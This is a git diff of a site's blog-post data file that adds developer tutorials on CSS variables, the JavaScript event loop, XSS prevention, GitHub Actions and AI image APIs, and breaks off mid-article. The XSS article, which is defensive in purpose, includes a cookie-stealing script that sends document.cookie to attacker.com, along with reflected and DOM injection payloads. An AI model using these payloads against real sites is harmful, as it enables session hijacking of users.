@@ -3556,7 +3556,7 @@ DLROW</code></pre>
       <h3>🔗 Unlock 50+ Free Tools Now: tools.huzi.pk</h3>
       <p>No signups. No fees. Just pure productivity power. 🚀</p>
     `,
-    imageUrl: 'https://i.postimg.cc/k4jWfV7d/The-Complete-Encyclopedia-of-Tools-huzi-pk-50-Tools-Demystified.webp',
+    imageUrl: 'https://i.postimg.cc/QCbTSw3f/tools-website.webp',
     imageHint: 'developer tools encyclopedia',
     author: 'Huzi',
     category: 'AI',
@@ -4303,7 +4303,7 @@ git push origin main
         <li><strong>Complex Forms:</strong> Static sites can't process form data. The solution is to submit the form to a serverless function or a third-party service like Formspree or Netlify Forms.</li>
       </ul>
       
-      <h3>The \`tools.huzi.pk\` Blueprint: A Modern Static Stack</h3>
+      <h3>The \'\'\'tools.huzi.pk\'\'\' Blueprint: A Modern Static Stack</h3>
       <p>This developer tools site exemplifies modern static best practices:</p>
       <ul>
         <li><strong>SSG:</strong> Astro, for its excellent performance and support for partial hydration.</li>
@@ -4361,7 +4361,7 @@ npx wrangler pages publish ./dist --project-name my-static-site</code></pre>
         <li><strong>Immense Security:</strong> A 99% reduction in common attack vectors.</li>
         <li><strong>Superior Performance:</strong> Near-perfect Core Web Vitals scores.</li>
       </ul>
-      <p>Sites like \`tools.huzi.pk\` prove that "static" no longer means simplistic. By leveraging the modern JAMstack, developers can build applications that are secure without being rigid, fast without being fragile, and scalable without being complex. The renaissance is here, and it's built on a foundation of pre-rendered perfection.</p>
+      <p>Sites like \'\'\'tools.huzi.pk\'\'\' prove that "static" no longer means simplistic. By leveraging the modern JAMstack, developers can build applications that are secure without being rigid, fast without being fragile, and scalable without being complex. The renaissance is here, and it's built on a foundation of pre-rendered perfection.</p>
     `,
     imageUrl: 'https://i.postimg.cc/QCbTSw3f/tools-website.webp',
     imageHint: 'static web renaissance',
@@ -5014,10 +5014,10 @@ db.query(query, (err, results) => {
       <p>Parameterized queries separate the SQL command from the data. The database is sent the query template first, and then the user-supplied data is sent separately. The database engine treats the user data strictly as data, not as executable code.</p>
 
       <h4>How to Implement Parameterized Queries</h4>
-      <p><strong>Vulnerable Code (Node.js with \`mysql\` package):</strong></p>
+      <p><strong>Vulnerable Code (Node.js with \'\'\'mysql\'\'\' package):</strong></p>
       <pre><code class="language-javascript">db.query(\`SELECT * FROM users WHERE id = \${userId}\`);</code></pre>
       
-      <p><strong>Secure Code (Node.js with \`mysql\` package):</strong></p>
+      <p><strong>Secure Code (Node.js with \'\'\'mysql\'\'\' package):</strong></p>
       <pre><code class="language-javascript">db.query('SELECT * FROM users WHERE id = ?', [userId], (err, results) => {
   // ...
 });</code></pre>
@@ -5767,6 +5767,640 @@ Cache-Control: public, max-age=3600</code></pre>
     imageHint: 'http rest api',
     author: 'Huzi',
     category: 'Programming',
+  },
+  {
+    id: 31,
+    slug: 'css-custom-properties-a-revolution-in-styling',
+    title: 'CSS Custom Properties (Variables): A Revolution in Styling',
+    excerpt: 'Forget endless find-and-replace for color changes. CSS Custom Properties (Variables) are a native CSS feature that will make your stylesheets more dynamic, maintainable, and powerful. This guide explains everything you need to know.',
+    content: `
+      <h2>Introduction: The Old Way vs. The New Way</h2>
+      <p>For years, managing values like colors, fonts, and spacing in large CSS files was a nightmare. If a client wanted to change the primary brand color, it meant a painstaking "find and replace" operation across dozens of files. Preprocessors like SASS/LESS solved this with variables, but they had a key limitation: they were static. Once compiled, the variable was gone.</p>
+      <p><strong>CSS Custom Properties</strong> are different. They are dynamic, live in the browser, and can be manipulated with JavaScript, opening up a new world of possibilities for theming, responsive design, and component-based styling.</p>
+
+      <h3>Chapter 1: The Basics of CSS Custom Properties</h3>
+      
+      <h4>Declaration</h4>
+      <p>You declare a custom property using two dashes (<code>--</code>) followed by the property name, typically on the <code>:root</code> pseudo-class so it's available globally.</p>
+      <pre><code class="language-css">:root {
+  --primary-color: #3498db;
+  --main-font-size: 16px;
+  --base-spacing: 1rem;
+}</code></pre>
+      <p>Custom property names are case-sensitive! <code>--primary-color</code> is different from <code>--Primary-Color</code>.</p>
+
+      <h4>Usage with the <code>var()</code> Function</h4>
+      <p>You use a custom property with the <code>var()</code> function.</p>
+      <pre><code class="language-css">.button {
+  background-color: var(--primary-color);
+  font-size: var(--main-font-size);
+  padding: var(--base-spacing);
+}
+
+h1 {
+  color: var(--primary-color);
+}</code></pre>
+
+      <h4>Providing Fallback Values</h4>
+      <p>The <code>var()</code> function can take a second argument: a fallback value to be used if the custom property is not defined.</p>
+      <pre><code class="language-css">.alert {
+  /* Uses --alert-color if it exists, otherwise defaults to red */
+  background-color: var(--alert-color, red);
+}</code></pre>
+      
+      <h3>Chapter 2: Scope and The Cascade</h3>
+      <p>Custom properties follow the same inheritance and cascade rules as standard CSS properties. This is what makes them so powerful.</p>
+      
+      <h4>Global vs. Local Scope</h4>
+      <p>While <code>:root</code> is great for global variables, you can override them or create new ones within any selector for a more localized scope.</p>
+      <pre><code class="language-css">/* Global theme */
+:root {
+  --text-color: #333;
+}
+
+/* Component-specific override */
+.dark-card {
+  --text-color: #eee; /* This only applies inside .dark-card */
+  background-color: #222;
+  color: var(--text-color);
+}
+
+p {
+  color: var(--text-color); /* Will be #333 */
+}
+
+.dark-card p {
+  color: var(--text-color); /* Will be #eee because it's inside .dark-card */
+}</code></pre>
+
+      <h3>Chapter 3: The JavaScript Connection - Dynamic Theming</h3>
+      <p>This is where custom properties truly shine over preprocessor variables. You can read and write them with JavaScript in real-time.</p>
+      <p>This makes creating features like a dark/light mode toggle trivial.</p>
+
+      <p><strong>The CSS:</strong></p>
+      <pre><code class="language-css">:root {
+  --background-color: #fff;
+  --text-color: #111;
+}
+
+[data-theme="dark"] {
+  --background-color: #111;
+  --text-color: #fff;
+}
+
+body {
+  background-color: var(--background-color);
+  color: var(--text-color);
+}</code></pre>
+
+      <p><strong>The JavaScript:</strong></p>
+      <pre><code class="language-javascript">const themeToggleButton = document.getElementById('theme-toggle');
+
+themeToggleButton.addEventListener('click', () => {
+  const currentTheme = document.documentElement.getAttribute('data-theme');
+  if (currentTheme === 'dark') {
+    document.documentElement.removeAttribute('data-theme');
+  } else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+  }
+});</code></pre>
+      <p>There's no need to add/remove a class on the body and write dozens of CSS overrides. You just change the value of the custom properties, and the entire UI reacts.</p>
+
+      <h3>Chapter 4: Practical Use Cases</h3>
+      
+      <h4>Consistent Spacing and Sizing</h4>
+      <pre><code class="language-css">:root {
+  --spacing-sm: 0.5rem;
+  --spacing-md: 1rem;
+  --spacing-lg: 2rem;
+}
+
+.card {
+  padding: var(--spacing-md);
+  margin-bottom: var(--spacing-lg);
+}</code></pre>
+      
+      <h4>Brand Colors and Themes</h4>
+      <pre><code class="language-css">:root {
+  --brand-primary: #5b21b6;
+  --brand-secondary: #d946ef;
+  --brand-accent: #f59e0b;
+}</code></pre>
+
+      <h4>Responsive Typography</h4>
+      <p>You can change the value of a custom property inside a media query to create fluid typography with a single source of truth.</p>
+      <pre><code class="language-css">:root {
+  --heading-font-size: 2rem;
+}
+
+@media (min-width: 768px) {
+  :root {
+    --heading-font-size: 3rem;
+  }
+}
+
+h1 {
+  font-size: var(--heading-font-size);
+}</code></pre>
+
+      <h3>Conclusion: A Fundamental Tool for Modern CSS</h3>
+      <p>CSS Custom Properties are not just a convenience; they represent a fundamental shift in how we can architect our stylesheets. They provide the dynamic capabilities of JavaScript with the declarative simplicity of CSS.</p>
+      <p>By adopting custom properties, you will create systems that are:</p>
+      <ul>
+        <li><strong>More Maintainable (DRY):</strong> Define values in one place and reuse them everywhere.</li>
+        <li><strong>More Dynamic:</strong> Easily change themes or styles with JavaScript.</li>
+        <li><strong>More Readable:</strong> Give semantic names to cryptic values (e.g., <code>var(--color-brand-primary)</code> instead of <code>#5A3E8D</code>).</li>
+      </ul>
+      <p>If you're not using them yet, start today. They are fully supported in all modern browsers and will fundamentally improve your CSS workflow.</p>
+    `,
+    imageUrl: 'https://placehold.co/600x400.png',
+    imageHint: 'css variables',
+    author: 'Huzi',
+    category: 'Programming',
+  },
+  {
+    id: 32,
+    slug: 'understanding-the-javascript-event-loop',
+    title: 'Understanding the JavaScript Event Loop: A Visual Guide',
+    excerpt: 'JavaScript is single-threaded, but it handles asynchronous operations without freezing the UI. How? The magic lies in the Event Loop. This guide demystifies this core concept with simple explanations and visual analogies.',
+    content: `
+      <h2>Introduction: The Concurrency Puzzle</h2>
+      <p>How can JavaScript, a language with only one thread (meaning it can only do one thing at a time), handle thousands of operations concurrently without blocking? It can handle user input, fetch API data, and run timers all at once. The answer is the <strong>Event Loop</strong> and a few other pieces working together behind the scenes.</p>
+      <p>Understanding the Event Loop is the key to understanding how asynchronous JavaScript really works.</p>
+
+      <h3>Chapter 1: The Core Components</h3>
+      <p>The JavaScript runtime environment (like a browser or Node.js) is more than just the JS engine. It also includes:</p>
+      <ul>
+        <li><strong>The Call Stack:</strong> This is where JavaScript keeps track of what function is currently running. When a function is called, it's pushed onto the stack. When it returns, it's popped off.</li>
+        <li><strong>Web APIs:</strong> These are provided by the browser (or C++ APIs in Node.js). They handle asynchronous operations like <code>setTimeout</code>, DOM events (e.g., clicks), and network requests (<code>fetch</code>). These are not part of the JavaScript engine itself.</li>
+        <li><strong>The Callback Queue (or Task Queue):</strong> This is a waiting area for functions that are ready to be executed. When a Web API finishes its task (e.g., a timer expires), it places the associated callback function in this queue.</li>
+        <li><strong>The Event Loop:</strong> This is the star of the show. The Event Loop has one simple job: to constantly monitor the Call Stack and the Callback Queue.</li>
+      </ul>
+
+      <h3>Chapter 2: The Process - A Step-by-Step Walkthrough</h3>
+      <p>Let's trace what happens with a simple piece of code:</p>
+      <pre><code class="language-javascript">console.log('Start');
+
+setTimeout(() => {
+  console.log('Timer finished');
+}, 1000);
+
+console.log('End');</code></pre>
+
+      <ol>
+        <li>
+          <strong>Step 1:</strong> <code>console.log('Start')</code> is pushed onto the Call Stack. It runs and prints "Start" to the console. Then it's popped off the stack.
+        </li>
+        <li>
+          <strong>Step 2:</strong> <code>setTimeout(...)</code> is pushed onto the Call Stack. <code>setTimeout</code> is a Web API, not a core JavaScript function. The browser kicks off a 1-second timer. The <code>setTimeout</code> function itself completes immediately and is popped off the Call Stack. The callback function <code>() => { console.log('Timer finished'); }</code> is now waiting in the Web API environment.
+        </li>
+        <li>
+          <strong>Step 3:</strong> <code>console.log('End')</code> is pushed onto the Call Stack. It runs and prints "End" to the console. Then it's popped off.
+        </li>
+        <li>
+          <strong>Step 4: The Event Loop's Moment.</strong> The Call Stack is now empty. The Event Loop checks the Callback Queue. It's still empty because the 1-second timer hasn't finished yet.
+        </li>
+        <li>
+          <strong>Step 5:</strong> After 1 second, the timer in the Web API environment completes. It moves our callback function <code>() => { console.log('Timer finished'); }</code> into the Callback Queue.
+        </li>
+        <li>
+          <strong>Step 6:</strong> The Event Loop sees that the Call Stack is empty and there's a task waiting in the Callback Queue. It takes the first task from the queue (our callback) and pushes it onto the Call Stack.
+        </li>
+        <li>
+          <strong>Step 7:</strong> The callback function executes. <code>console.log('Timer finished')</code> is called, prints "Timer finished" to the console, and is then popped off the stack.
+        </li>
+      </ol>
+      <p>The final output is:</p>
+      <pre><code class="language-text">Start
+End
+Timer finished</code></pre>
+      <p>This explains why <code>setTimeout(fn, 0)</code> doesn't run immediately. It still has to go through the whole loop, so it will always run *after* the current synchronous code has finished.</p>
+
+      <h3>Chapter 3: Microtasks and Macrotasks - The Priority Lane</h3>
+      <p>The Callback Queue we discussed is more accurately called the **Macrotask Queue**. There's another, higher-priority queue called the **Microtask Queue**.</p>
+      
+      <ul>
+        <li><strong>Macrotasks:</strong> <code>setTimeout</code>, <code>setInterval</code>, DOM events, I/O operations.</li>
+        <li><strong>Microtasks:</strong> <code>Promise.then()</code>, <code>.catch()</code>, <code>.finally()</code>, <code>async/await</code> code, <code>queueMicrotask()</code>.</li>
+      </ul>
+
+      <p>The Event Loop's rule is: <strong>after each macrotask, process the ENTIRE microtask queue before moving on to the next macrotask.</strong></p>
+      
+      <p>Let's see it in action:</p>
+      <pre><code class="language-javascript">console.log('1: Start');
+
+setTimeout(() => console.log('2: Timeout'), 0);
+
+Promise.resolve().then(() => console.log('3: Promise'));
+
+console.log('4: End');</code></pre>
+      
+      <p>What's the output?</p>
+      <ol>
+        <li>'1: Start' and '4: End' are logged synchronously.</li>
+        <li>The <code>setTimeout</code> callback is placed in the Macrotask Queue.</li>
+        <li>The <code>Promise.then()</code> callback is placed in the Microtask Queue.</li>
+        <li>The synchronous code finishes. The Event Loop checks the Microtask Queue first. It finds the promise callback and runs it, logging '3: Promise'.</li>
+        <li>The Microtask Queue is now empty. The Event Loop checks the Macrotask Queue. It finds the timeout callback and runs it, logging '2: Timeout'.</li>
+      </ol>
+      <p>The final output is:</p>
+      <pre><code class="language-text">1: Start
+4: End
+3: Promise
+2: Timeout</code></pre>
+      
+      <h3>Conclusion: Why It Matters</h3>
+      <p>Understanding the Event Loop is not just an academic exercise. It helps you:</p>
+      <ul>
+        <li><strong>Debug Asynchronous Code:</strong> Understand why certain callbacks fire in an unexpected order.</li>
+        <li><strong>Write Performant Code:</strong> Avoid blocking the main thread with long-running synchronous tasks, which leads to a frozen UI.</li>
+        <li><strong>Master Advanced JavaScript:</strong> Fully grasp how Promises and async/await work under the hood.</li>
+      </ul>
+      <p>The next time you write an async function or set a timer, visualize the journey of your code through the Call Stack, Web APIs, and the Queues. This mental model is one of the most powerful tools in a JavaScript developer's arsenal.</p>
+    `,
+    imageUrl: 'https://placehold.co/600x400.png',
+    imageHint: 'javascript event loop',
+    author: 'Huzi',
+    category: 'Programming',
+  },
+  {
+    id: 33,
+    slug: 'cross-site-scripting-xss-a-guide-to-prevention',
+    title: 'Cross-Site Scripting (XSS): A Developer\'s Guide to Prevention',
+    excerpt: 'Cross-Site Scripting (XSS) is one of the most common and dangerous web vulnerabilities. This guide explains what XSS is, how attackers exploit it, and provides a clear, actionable checklist for developers to prevent it in their applications.',
+    content: `
+      <h2>Introduction: The Trust Betrayal</h2>
+      <p>Cross-Site Scripting (XSS) is a type of security vulnerability where an attacker injects malicious scripts (usually JavaScript) into a web page viewed by other users. Unlike other attacks that target the server, XSS targets the users of your application, stealing their data and compromising their accounts by exploiting the trust they have in your site.</p>
+      <p>If your website allows users to input data that is later displayed without proper sanitization, you are likely vulnerable to XSS.</p>
+
+      <h3>Chapter 1: The Three Types of XSS Attacks</h3>
+      
+      <h4>1. Stored (or Persistent) XSS</h4>
+      <p>This is the most dangerous type of XSS. The attacker injects a malicious script that gets permanently stored on the target server, such as in a database. When a victim visits a page that retrieves this stored data, the script is served to their browser as part of the legitimate page and executes.</p>
+      <p><strong>Common Targets:</strong> Comment sections, user profiles, forum posts.</p>
+      <p><strong>Example Scenario:</strong></p>
+      <ol>
+        <li>An attacker posts a comment on a blog: <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie);&lt;/script&gt;</code>.</li>
+        <li>The blog's backend stores this comment in the database without cleaning it.</li>
+        <li>Every other user who views that blog post will have their browser execute the script, sending their session cookie to the attacker's server.</li>
+        <li>The attacker can now use this cookie to hijack the victim's session.</li>
+      </ol>
+
+      <h4>2. Reflected (or Non-Persistent) XSS</h4>
+      <p>In this attack, the malicious script is "reflected" off a web server. It's delivered to a victim through a different route, such as a link in an email or a malicious website. The injected code is included as part of the request sent to the server, and the server's response includes the script.</p>
+      <p><strong>Common Target:</strong> Search results pages.</p>
+      <p><strong>Example Scenario:</strong></p>
+      <ol>
+        <li>A website has a search URL like: <code>https://example.com/search?query=mysearchterm</code>.</li>
+        <li>The search page displays: "Showing results for: mysearchterm".</li>
+        <li>An attacker crafts a malicious URL: <code>https://example.com/search?query=&lt;script&gt;alert('XSS');&lt;/script&gt;</code>.</li>
+        <li>The attacker sends this link to a victim in a phishing email.</li>
+        <li>The victim clicks the link. The browser sends the malicious script to the server as part of the URL.</li>
+        <li>The server includes the script in the HTML response: "Showing results for: &lt;script&gt;alert('XSS');&lt;/script&gt;".</li>
+        <li>The victim's browser executes the script.</li>
+      </ol>
+
+      <h4>3. DOM-Based XSS</h4>
+      <p>This is a more advanced form of XSS where the entire attack happens on the client-side. The server is not involved. The script is injected by manipulating the Document Object Model (DOM) in the victim's browser, typically using a URL fragment (<code>#</code>).</p>
+      <p><strong>Example Scenario:</strong></p>
+      <p>A web page has client-side JavaScript that reads from the URL and writes it to the page:</p>
+      <pre><code class="language-javascript">const username = window.location.hash.substring(1);
+document.getElementById('welcome-message').innerHTML = 'Welcome, ' + username;</code></pre>
+      <p>An attacker crafts a URL: <code>https://example.com/welcome#&lt;img src=1 onerror=alert('XSS')&gt;</code>. When a victim visits this URL, the JavaScript on the page takes the malicious payload from the URL fragment and writes it directly into the DOM, causing it to execute.</p>
+      
+      <h3>Chapter 2: The Definitive Prevention Strategy</h3>
+      <p>Preventing XSS comes down to one golden rule: **Never trust user-provided data.** You must treat all input as potentially malicious and sanitize it before rendering it on a page.</p>
+
+      <h4>1. Output Encoding: The Primary Defense</h4>
+      <p>Output encoding is the most crucial defense. Before you render any user-provided data in your HTML, you must escape it to prevent it from being interpreted as active content. This means converting special characters into their HTML entity equivalents.</p>
+      <table>
+        <thead>
+          <tr>
+            <th>Character</th>
+            <th>HTML Entity</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>&lt;</td><td><code>&amp;lt;</code></td></tr>
+          <tr><td>&gt;</td><td><code>&amp;gt;</code></td></tr>
+          <tr><td>&amp;</td><td><code>&amp;amp;</code></td></tr>
+          <tr><td>"</td><td><code>&amp;quot;</code></td></tr>
+          <tr><td>'</td><td><code>&amp;#x27;</code></td></tr>
+        </tbody>
+      </table>
+      <p>Most modern templating frameworks (like React, Vue, Angular) do this for you automatically. If you are not using such a framework, you must use a library to perform this encoding.</p>
+      <p><strong>Never use <code>innerHTML</code> to insert user content.</strong> Use <code>textContent</code> instead, which automatically treats the content as plain text.</p>
+
+      <h4>2. Content Security Policy (CSP)</h4>
+      <p>CSP is a powerful, defense-in-depth mechanism. It's a browser security feature that you can enable by setting an HTTP header. It allows you to specify which domains the browser should consider to be valid sources of executable scripts.</p>
+      <p><strong>Example CSP Header:</strong></p>
+      <pre><code class="language-http">Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com;</code></pre>
+      <p>This policy tells the browser: "Only allow resources (images, scripts, etc.) to be loaded from my own domain (<code>'self'</code>). As an exception, allow scripts to be loaded from <code>https://apis.google.com</code>." This would completely block an XSS payload trying to load a script from <code>attacker.com</code>.</p>
+      
+      <h4>3. Use Modern Frameworks with Context-Aware Encoding</h4>
+      <p>Frameworks like React, Angular, and Vue are designed with XSS prevention in mind. They automatically encode data when you render it, making it much harder to introduce a vulnerability accidentally. Use them whenever possible.</p>
+
+      <h4>4. Set the <code>HttpOnly</code> Flag on Cookies</h4>
+      <p>To mitigate the damage of an XSS attack, set the <code>HttpOnly</code> flag on your session cookies. This prevents JavaScript (including malicious scripts) from being able to access the cookie, making session hijacking much more difficult.</p>
+
+      <h3>Conclusion: A Developer's Responsibility</h3>
+      <p>XSS is a persistent threat, but it is preventable. As a developer, it's your responsibility to protect your users by sanitizing all data that your application displays.</p>
+      <p><strong>Your XSS Prevention Checklist:</strong></p>
+      <ul>
+        <li>✅ **Encode all user-supplied data** on output.</li>
+        <li>✅ Implement a strict **Content Security Policy (CSP)**.</li>
+        <li>✅ Use a **modern frontend framework** that handles encoding automatically.</li>
+        <li>✅ Set the **<code>HttpOnly</code> flag** on sensitive cookies.</li>
+      </ul>
+      <p>By making these practices a standard part of your development workflow, you can build applications that are resilient to XSS and protect your users' trust and data.</p>
+    `,
+    imageUrl: 'https://placehold.co/600x400.png',
+    imageHint: 'xss cybersecurity',
+    author: 'Huzi',
+    category: 'Cybersecurity',
+  },
+  {
+    id: 34,
+    slug: 'ci-cd-with-github-actions-a-beginners-guide',
+    title: 'CI/CD with GitHub Actions: A Beginner\'s Guide to Automation',
+    excerpt: 'Automate your development workflow from code commit to deployment with GitHub Actions. This guide breaks down the core concepts of CI/CD and provides a practical, step-by-step example to help you build your first automated pipeline.',
+    content: `
+      <h2>Introduction: Why Automate?</h2>
+      <p>In modern software development, speed and reliability are everything. Manually testing, building, and deploying code is slow, error-prone, and inefficient. This is where CI/CD comes in.</p>
+      <ul>
+        <li><strong>Continuous Integration (CI):</strong> The practice of frequently merging all developers' code changes into a central repository, after which automated builds and tests are run.</li>
+        <li><strong>Continuous Deployment/Delivery (CD):</strong> The practice of automatically deploying all code changes that pass the CI stage to a testing or production environment.</li>
+      </ul>
+      <p><strong>GitHub Actions</strong> is a powerful and flexible CI/CD platform built directly into GitHub, making it incredibly easy to automate your workflows.</p>
+
+      <h3>Chapter 1: The Building Blocks of GitHub Actions</h3>
+      <p>A GitHub Actions workflow is defined in a YAML file located in the <code>.github/workflows/</code> directory of your repository.</p>
+      
+      <h4>Core Concepts:</h4>
+      <ul>
+        <li><strong>Workflow:</strong> An automated process defined by a YAML file. A repository can have multiple workflows.</li>
+        <li><strong>Event:</strong> A specific activity that triggers a workflow, such as a <code>push</code> to a branch, a <code>pull_request</code> being opened, or a schedule (cron).</li>
+        <li><strong>Job:</strong> A set of steps that execute on the same "runner" (a virtual machine). Jobs run in parallel by default.</li>
+        <li><strong>Step:</strong> An individual task that can run commands or an "action".</li>
+        <li><strong>Action:</strong> A reusable piece of code that performs a complex but common task, like checking out your repository code (<code>actions/checkout</code>) or setting up Node.js (<code>actions/setup-node</code>).</li>
+        <li><strong>Runner:</strong> A server that runs your workflows. GitHub provides free runners for public repositories (Ubuntu, Windows, macOS).</li>
+      </ul>
+
+      <h3>Chapter 2: Building Your First CI Pipeline</h3>
+      <p>Let's create a simple CI workflow for a Node.js application that runs tests on every push to the <code>main</code> branch.</p>
+      <p>Create a file named <code>.github/workflows/ci.yml</code>:</p>
+      <pre><code class="language-yaml"># Name of your workflow
+name: Node.js CI
+
+# Event that triggers the workflow
+on:
+  push:
+    branches: [ "main" ]
+  pull_request:
+    branches: [ "main" ]
+
+# Jobs to be executed
+jobs:
+  build:
+    # The type of runner the job will run on
+    runs-on: ubuntu-latest
+
+    strategy:
+      matrix:
+        node-version: [16.x, 18.x, 20.x]
+
+    steps:
+    # 1. Check out the repository code
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    # 2. Set up the specified version of Node.js
+    - name: Use Node.js \${{ matrix.node-version }}
+      uses: actions/setup-node@v3
+      with:
+        node-version: \${{ matrix.node-version }}
+        cache: 'npm'
+
+    # 3. Install dependencies
+    - name: Install dependencies
+      run: npm ci
+
+    # 4. Run the build command (if any)
+    - name: Build project
+      run: npm run build --if-present
+
+    # 5. Run tests
+    - name: Run tests
+      run: npm test</code></pre>
+
+      <h4>What this workflow does:</h4>
+      <ol>
+        <li>It triggers on any push or pull request to the <code>main</code> branch.</li>
+        <li>It defines a job named <code>build</code> that runs on an Ubuntu runner.</li>
+        <li>It uses a "matrix strategy" to run the job three times, once for each specified Node.js version (16, 18, 20), ensuring compatibility.</li>
+        <li>The steps check out your code, install Node.js, install your project's dependencies (using <code>npm ci</code> for faster, more reliable installs), and finally run your tests.</li>
+      </ol>
+      <p>Once you commit this file, you can see the workflow run in the "Actions" tab of your GitHub repository.</p>
+
+      <h3>Chapter 3: From CI to CD - Continuous Deployment</h3>
+      <p>Now that we have automated testing, let's automatically deploy our application to production when the tests pass.</p>
+      <p>We'll add a new job to our workflow that deploys to a service like Netlify or Vercel.</p>
+
+      <pre><code class="language-yaml"># ... (previous CI job)
+
+jobs:
+  build:
+    # ... (build job from before)
+
+  deploy:
+    # This job depends on the 'build' job
+    needs: build
+    runs-on: ubuntu-latest
+    
+    # Only run this job on a push to the main branch, not on pull requests
+    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
+    
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v3
+
+      - name: Deploy to Netlify
+        uses: nwtgck/actions-netlify@v2
+        with:
+          publish-dir: './dist'
+          production-branch: main
+          github-token: \${{ secrets.GITHUB_TOKEN }}
+        env:
+          NETLIFY_AUTH_TOKEN: \${{ secrets.NETLIFY_AUTH_TOKEN }}
+          NETLIFY_SITE_ID: \${{ secrets.NETLIFY_SITE_ID }}
+        timeout-minutes: 1</code></pre>
+
+      <h4>Key Concepts in the Deployment Job:</h4>
+      <ul>
+        <li><strong><code>needs: build</code>:</strong> This ensures the <code>deploy</code> job will only run if the <code>build</code> job completes successfully.</li>
+        <li><strong><code>if: ...</code>:</strong> This conditional statement prevents the deployment from running on pull requests or pushes to other branches.</li>
+        <li><strong>Secrets:</strong> Sensitive information like API tokens (<code>NETLIFY_AUTH_TOKEN</code>) should never be hard-coded. You should store them in your repository's "Secrets" settings (Settings > Secrets and variables > Actions). GitHub Actions makes them available via the <code>secrets</code> context.</li>
+      </ul>
+
+      <h3>Chapter 4: Best Practices for GitHub Actions</h3>
+      <ul>
+        <li><strong>Use Community Actions:</strong> Don't reinvent the wheel. The GitHub Marketplace has thousands of reusable actions for common tasks.</li>
+        <li><strong>Cache Dependencies:</strong> Use actions like <code>actions/setup-node</code> with caching enabled to speed up your builds by not re-downloading dependencies every time.</li>
+        <li><strong>Keep Jobs Small and Focused:</strong> Each job should have a single responsibility (e.g., test, lint, deploy).</li>
+        <li><strong>Use Environments for Security:</strong> For production deployments, use GitHub Environments to add protection rules, such as requiring approval from a specific team member before a deployment can proceed.</li>
+      </ul>
+
+      <h3>Conclusion: The Power of Automation</h3>
+      <p>GitHub Actions empowers you to build professional-grade CI/CD pipelines directly within your development ecosystem. By automating your testing and deployment processes, you can:</p>
+      <ul>
+        <li><strong>Catch Bugs Earlier:</strong> CI ensures that every change is tested automatically.</li>
+        <li><strong>Deploy Faster and More Reliably:</strong> CD removes the risk of human error from the deployment process.</li>
+        <li><strong>Improve Productivity:</strong> Spend less time on manual processes and more time writing code.</li>
+      </ul>
+      <p>Start with a simple CI pipeline for one of your projects today. The initial time investment will pay for itself many times over in the long run.</p>
+    `,
+    imageUrl: 'https://placehold.co/600x400.png',
+    imageHint: 'github actions ci/cd',
+    author: 'Huzi',
+    category: 'Linux',
+  },
+  {
+    id: 35,
+    slug: 'ai-image-generation-a-developers-guide',
+    title: 'AI Image Generation: A Developer\'s Guide to Creating Images with Code',
+    excerpt: 'Go beyond web UIs and learn how to programmatically generate AI images using APIs. This guide provides a practical walkthrough for developers on how to use models like DALL-E 3 and Stable Diffusion to create, edit, and manipulate images with code.',
+    content: `
+      <h2>Introduction: The New Frontier of Creative APIs</h2>
+      <p>AI image generation has captured the public imagination with web interfaces like Midjourney and DALL-E. However, the real power for developers lies in using these models via APIs to build applications, automate content creation, and integrate dynamic visuals into their projects.</p>
+      <p>This guide will focus on the practical steps a developer needs to take to get started with programmatic image generation, using libraries and API calls.</p>
+
+      <h3>Chapter 1: Choosing Your Model and API</h3>
+      <p>There are several major players in the AI image generation space, each with its own API and strengths.</p>
+      <table>
+        <thead>
+          <tr>
+            <th>Model</th>
+            <th>Provider</th>
+            <th>Strengths</th>
+            <th>Best For</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td><strong>DALL-E 3</strong></td>
+            <td>OpenAI</td>
+            <td>Ease of use, great at following complex prompts, integrated with ChatGPT.</td>
+            <td>General purpose, high-quality illustrations, applications needing strong prompt adherence.</td>
+          </tr>
+          <tr>
+            <td><strong>Stable Diffusion</strong></td>
+            <td>Stability AI / Replicate</td>
+            <td>Open-source, highly customizable with LoRAs and ControlNets, powerful for specific styles.</td>
+            <td>Custom applications, fine-tuned models, realistic images, developers wanting more control.</td>
+          </tr>
+          <tr>
+            <td><strong>Midjourney</strong></td>
+            <td>Midjourney, Inc.</td>
+            <td>Extremely high artistic quality, opinionated and beautiful style.</td>
+            <td>Artistic and conceptual imagery. (Note: API access is limited/not public).</td>
+          </tr>
+        </tbody>
+      </table>
+      <p>For this guide, we will focus on the **Replicate API** to run Stable Diffusion, as it provides a simple, serverless way to interact with a wide variety of open-source models.</p>
+
+      <h3>Chapter 2: Setting Up Your Environment</h3>
+      <h4>2.1 Getting API Keys</h4>
+      <ol>
+        <li>Go to <a href="https://replicate.com" target="_blank" rel="noopener">Replicate.com</a> and sign in with your GitHub account.</li>
+        <li>Navigate to your account settings and find your API token.</li>
+      </ol>
+      
+      <h4>2.2 Project Setup (Node.js Example)</h4>
+      <p>Create a new Node.js project:</p>
+      <pre><code class="language-bash">mkdir ai-image-generator
+cd ai-image-generator
+npm init -y
+npm install replicate dotenv</code></pre>
+      <p>Create a <code>.env</code> file to store your API key securely:</p>
+      <pre><code class="language-bash">REPLICATE_API_TOKEN="your_api_token_here"</code></pre>
+
+      <h3>Chapter 3: Your First Image Generation with Code</h3>
+      <p>Let's write a script to generate an image. Create a file named <code>generate.js</code>.</p>
+      <pre><code class="language-javascript">require('dotenv').config();
+const Replicate = require('replicate');
+
+const replicate = new Replicate({
+  auth: process.env.REPLICATE_API_TOKEN,
+});
+
+async function generateImage() {
+  console.log("Running the model...");
+  const input = {
+    prompt: "A cinematic photo of a raccoon wearing a tiny top hat, in a futuristic city, professional photography, 8k",
+    negative_prompt: "blurry, low quality, cartoon, watermark",
+    width: 1024,
+    height: 1024,
+  };
+
+  const output = await replicate.run(
+    "stability-ai/stable-diffusion-3",
+    { input }
+  );
+
+  console.log("Image generated!");
+  console.log(output);
+  // Output will be an array of URLs to the generated images
+}
+
+generateImage();</code></pre>
+
+      <h4>Running the Script</h4>
+      <pre><code class="language-bash">node generate.js</code></pre>
+      <p>After a few seconds, you'll get a URL in your console pointing to your generated image. You've just created an AI image with code!</p>
+
+      <h3>Chapter 4: Key Parameters for Image Generation</h3>
